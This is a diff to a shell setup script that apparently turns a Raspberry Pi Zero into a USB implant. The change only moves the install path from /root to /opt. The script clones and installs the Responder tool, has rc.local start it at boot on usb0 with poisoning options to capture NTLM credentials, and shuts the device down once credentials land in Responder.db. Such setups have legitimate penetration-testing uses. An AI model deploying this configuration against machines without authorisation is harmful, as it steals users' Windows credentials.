@@ -49,7 +49,7 @@ EOF
 ##Install Responder and dependencies
 apt-get install -y python git python-pip python-dev screen sqlite3 inotify-tools
 pip install pycrypto
-git clone https://github.com/spiderlabs/responder /root/responder
+git clone https://github.com/spiderlabs/responder /opt/responder
 
 
 ##Start Responder at bootup
@@ -57,13 +57,13 @@ sed -i '/exit/d' /etc/rc.local
 
 cat <<'EOF'>>/etc/rc.local
 # Start Responder
-/usr/bin/screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F'
+/usr/bin/screen -dmS responder bash -c 'cd /opt/responder/; python Responder.py -I usb0 -f -w -r -d -F'
 EOF
 
 ## Stop Responder when its done grabbing NTLM creds and shut down PiZero
 ## Comment out everything from here down except for exit 0 if you don't want it to shut down the PiZero after it gets the creds
 cat <<'EOF'>>/etc/rc.local
 # Shutdown once creds have been obtained
-/usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done'
+/usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /opt/responder/Responder.db; do shutdown -h now; done'
 exit 0
 EOF
